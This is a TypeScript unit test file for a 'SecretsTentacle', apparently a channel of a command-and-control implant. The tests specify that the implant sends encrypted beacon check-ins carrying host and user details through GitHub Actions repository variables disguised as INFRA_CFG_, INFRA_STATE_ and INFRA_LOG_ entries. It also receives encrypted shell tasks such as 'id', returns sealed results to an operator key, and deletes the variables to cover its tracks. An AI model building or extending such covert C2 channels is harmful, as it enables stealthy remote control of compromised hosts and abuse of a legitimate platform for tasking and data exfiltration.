import { describe, it, expect, mock, beforeEach } from "bun:test";

// ── Octokit mock factory ──────────────────────────────────────────────────────

function makeActions(overrides: Record<string, any> = {}) {
  return {
    listRepoVariables:  mock(async () => ({ data: { variables: [] } })),
    getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    createRepoVariable: mock(async () => ({})),
    updateRepoVariable: mock(async () => ({})),
    deleteRepoVariable: mock(async () => ({})),
    ...(overrides ?? {}),
  };
}

function makeOctokit(actionsOverrides: Record<string, any> = {}) {
  return {
    hook: { wrap: (_name: string, _fn: Function) => {} },
    rest: {
      actions: makeActions(actionsOverrides),
      repos:   { get: mock(async () => ({})) },
    },
  } as any;
}

// Mock @octokit/rest before importing anything that imports it
mock.module("@octokit/rest", () => ({
  Octokit: class {
    hook = { wrap: (_name: string, _fn: Function) => {} };
    rest  = {
      actions: makeActions(),
      repos:   { get: mock(async () => ({})) },
    };
  },
}));

import { SecretsTentacle } from "../tentacles/SecretsTentacle.ts";
import {
  generateKeyPair, encryptBox, openSealBox, bytesToBase64,
} from "../crypto/sodium.ts";
import type { BeaconConfig } from "../types.ts";

// ── Helpers ───────────────────────────────────────────────────────────────────

async function makeConfig(overrides: Partial<BeaconConfig> = {}): Promise<BeaconConfig> {
  const operatorKp = await generateKeyPair();
  const beaconKp   = await generateKeyPair();
  return {
    id: "aabbccdd-1122-3344-5566-778899aabbcc",
    repo: { owner: "testowner", name: "testrepo" },
    token: "ghp_test",
    tentaclePriority: ["secrets"],
    sleepSeconds: 60,
    jitter: 0.3,
    operatorPublicKey: operatorKp.publicKey,
    beaconKeyPair: beaconKp,
    ...overrides,
  } as BeaconConfig;
}

const CHECKIN_PAYLOAD = {
  beaconId:  "aabbccdd-1122-3344-5566-778899aabbcc",
  publicKey: "",
  hostname:  "infra-host",
  username:  "deploy",
  os:        "linux",
  arch:      "x64",
  pid:       42,
  checkinAt: new Date().toISOString(),
};

// ── Tests ─────────────────────────────────────────────────────────────────────

describe("SecretsTentacle kind", () => {
  it("kind is 'secrets'", async () => {
    const t = new SecretsTentacle(await makeConfig());
    expect(t.kind).toBe("secrets");
  });
});

describe("SecretsTentacle.isAvailable()", () => {
  it("returns true when listRepoVariables succeeds (200)", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);
    (t as any).octokit = makeOctokit({
      listRepoVariables: mock(async () => ({ data: { variables: [] } })),
    });
    expect(await t.isAvailable()).toBe(true);
  });

  it("returns false when listRepoVariables throws (401/403/404)", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);
    (t as any).octokit = makeOctokit({
      listRepoVariables: mock(async () => { throw Object.assign(new Error("Forbidden"), { status: 403 }); }),
    });
    expect(await t.isAvailable()).toBe(false);
  });

  it("returns false and never throws on unexpected error", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);
    (t as any).octokit = makeOctokit({
      listRepoVariables: mock(async () => { throw new Error("Network error"); }),
    });
    await expect(t.isAvailable()).resolves.toBe(false);
  });
});

describe("SecretsTentacle.checkin() — ACK registration", () => {
  it("writes INFRA_CFG_* ACK variable on first checkin", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    const updateVar = mock(async () => ({}));
    const createVar = mock(async () => ({}));
    const getVar    = mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: updateVar,
      createRepoVariable: createVar,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    getVar,
    });

    await t.checkin(CHECKIN_PAYLOAD);

    // Either updateRepoVariable or createRepoVariable must have been called
    const ackWritten = updateVar.mock.calls.length > 0 || createVar.mock.calls.length > 0;
    expect(ackWritten).toBe(true);

    // Check the written variable has the correct INFRA_CFG_ prefix
    const writeCalls = [...updateVar.mock.calls, ...createVar.mock.calls];
    const varName = ((writeCalls[0] as any)[0] as any).name as string;
    expect(varName).toMatch(/^INFRA_CFG_/);
    expect(varName).toContain(cfg.id.slice(0, 8));
  });

  it("ACK variable value is base64-encoded JSON containing public key", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    let capturedValue: string | undefined;
    const captureCreate = mock(async (params: any) => {
      capturedValue = params.value;
      return {};
    });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
      createRepoVariable: captureCreate,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    await t.checkin(CHECKIN_PAYLOAD);

    expect(capturedValue).toBeDefined();
    // Decode and verify structure
    const decoded = JSON.parse(Buffer.from(capturedValue!, "base64").toString("utf8"));
    expect(decoded).toHaveProperty("k");
    expect(decoded).toHaveProperty("t");
    expect(typeof decoded.k).toBe("string");
    expect(decoded.k.length).toBeGreaterThan(0);
  });

  it("does NOT re-send ACK on subsequent checkins", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    const updateVar = mock(async () => ({}));
    const getVar    = mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: updateVar,
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    getVar,
    });

    await t.checkin(CHECKIN_PAYLOAD);
    const callsAfterFirst = updateVar.mock.calls.length;

    await t.checkin(CHECKIN_PAYLOAD);
    // No additional ACK write on second call
    expect(updateVar.mock.calls.length).toBe(callsAfterFirst);
  });
});

describe("SecretsTentacle.checkin() — task polling", () => {
  it("returns [] when INFRA_STATE variable is absent (404)", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    const tasks = await t.checkin(CHECKIN_PAYLOAD);
    expect(tasks).toEqual([]);
  });

  it("decrypts tasks from INFRA_STATE variable and deletes it after reading", async () => {
    const operatorKp = await generateKeyPair();
    const beaconKp   = await generateKeyPair();
    const cfg = await makeConfig({ operatorPublicKey: operatorKp.publicKey, beaconKeyPair: beaconKp });
    const t   = new SecretsTentacle(cfg);

    const taskPayload = [{ taskId: "task-aabb", kind: "shell", args: { cmd: "id" } }];
    const encrypted   = await encryptBox(
      JSON.stringify(taskPayload),
      beaconKp.publicKey,
      operatorKp.secretKey,
    );

    const deleteVar = mock(async () => ({}));
    const getVar    = mock(async (params: any) => {
      if ((params.name as string).startsWith("INFRA_STATE_")) {
        return { data: { value: JSON.stringify(encrypted) } };
      }
      throw Object.assign(new Error("Not Found"), { status: 404 });
    });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: deleteVar,
      getRepoVariable:    getVar,
    });

    const tasks = await t.checkin(CHECKIN_PAYLOAD);

    expect(tasks).toHaveLength(1);
    expect(tasks[0]!.taskId).toBe("task-aabb");
    expect(tasks[0]!.kind).toBe("shell");

    // Variable should have been deleted after reading
    expect(deleteVar.mock.calls.length).toBeGreaterThan(0);
    const deletedVarName = ((deleteVar.mock.calls[0] as any)[0] as any).name as string;
    expect(deletedVarName).toMatch(/^INFRA_STATE_/);
  });

  it("returns [] and does not throw when INFRA_STATE value is malformed", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => ({ data: { value: "not-valid-json" } })),
    });

    const tasks = await t.checkin(CHECKIN_PAYLOAD);
    expect(tasks).toEqual([]);
  });

  it("returns [] and does not throw when INFRA_STATE value is empty", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => ({})),
      createRepoVariable: mock(async () => ({})),
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => ({ data: { value: "" } })),
    });

    const tasks = await t.checkin(CHECKIN_PAYLOAD);
    expect(tasks).toEqual([]);
  });
});

describe("SecretsTentacle.submitResult()", () => {
  it("writes an INFRA_LOG_* variable with sealed payload", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig({ operatorPublicKey: operatorKp.publicKey });
    const t   = new SecretsTentacle(cfg);

    const updateVar = mock(async () => ({}));
    const createVar = mock(async () => ({}));

    (t as any).octokit = makeOctokit({
      updateRepoVariable: updateVar,
      createRepoVariable: createVar,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    const result = {
      taskId:      "task-ccdd1122",
      beaconId:    "aabbccdd-1122-3344-5566-778899aabbcc",
      success:     true,
      output:      "deploy ok",
      completedAt: new Date().toISOString(),
    };

    await t.submitResult(result);

    // Either update or create must have been called
    const varWritten = updateVar.mock.calls.length > 0 || createVar.mock.calls.length > 0;
    expect(varWritten).toBe(true);

    // Variable name should match INFRA_LOG_ prefix with first 8 chars of taskId
    const writeCalls = [...updateVar.mock.calls, ...createVar.mock.calls];
    const varName = ((writeCalls[0] as any)[0] as any).name as string;
    expect(varName).toMatch(/^INFRA_LOG_/);
    expect(varName).toContain("task-ccd".slice(0, 8));
  });

  it("result variable value is a sealed base64 string decryptable with operator key", async () => {
    const operatorKp = await generateKeyPair();
    const cfg = await makeConfig({ operatorPublicKey: operatorKp.publicKey });
    const t   = new SecretsTentacle(cfg);

    let capturedValue: string | undefined;
    const captureCreate = mock(async (params: any) => {
      capturedValue = params.value;
      return {};
    });

    (t as any).octokit = makeOctokit({
      updateRepoVariable: mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
      createRepoVariable: captureCreate,
      deleteRepoVariable: mock(async () => ({})),
      getRepoVariable:    mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });

    const result = {
      taskId:      "task-eeff0011",
      beaconId:    "aabbccdd-1122-3344-5566-778899aabbcc",
      success:     true,
      output:      "status: ok",
      completedAt: new Date().toISOString(),
    };

    await t.submitResult(result);

    expect(capturedValue).toBeDefined();
    // Decrypt and verify
    const plainBytes = await openSealBox(capturedValue!, operatorKp.publicKey, operatorKp.secretKey);
    const plain = new TextDecoder().decode(plainBytes);
    const decoded = JSON.parse(plain);
    expect(decoded.taskId).toBe("task-eeff0011");
    expect(decoded.output).toBe("status: ok");
  });
});

describe("SecretsTentacle.teardown()", () => {
  it("resolves without throwing", async () => {
    const t = new SecretsTentacle(await makeConfig());
    (t as any).octokit = makeOctokit({
      deleteRepoVariable: mock(async () => ({})),
    });
    await expect(t.teardown()).resolves.toBeUndefined();
  });

  it("resolves without throwing even when delete returns 404", async () => {
    const t = new SecretsTentacle(await makeConfig());
    (t as any).octokit = makeOctokit({
      deleteRepoVariable: mock(async () => { throw Object.assign(new Error("Not Found"), { status: 404 }); }),
    });
    await expect(t.teardown()).resolves.toBeUndefined();
  });

  it("resolves without throwing even when delete throws an unexpected error", async () => {
    const t = new SecretsTentacle(await makeConfig());
    (t as any).octokit = makeOctokit({
      deleteRepoVariable: mock(async () => { throw new Error("Network timeout"); }),
    });
    await expect(t.teardown()).resolves.toBeUndefined();
  });

  it("attempts to delete both INFRA_CFG and INFRA_STATE variables", async () => {
    const cfg = await makeConfig();
    const t   = new SecretsTentacle(cfg);

    const deletedNames: string[] = [];
    (t as any).octokit = makeOctokit({
      deleteRepoVariable: mock(async (params: any) => {
        deletedNames.push(params.name);
        return {};
      }),
    });

    await t.teardown();

    expect(deletedNames.some(n => n.startsWith("INFRA_CFG_"))).toBe(true);
    expect(deletedNames.some(n => n.startsWith("INFRA_STATE_"))).toBe(true);
  });
});
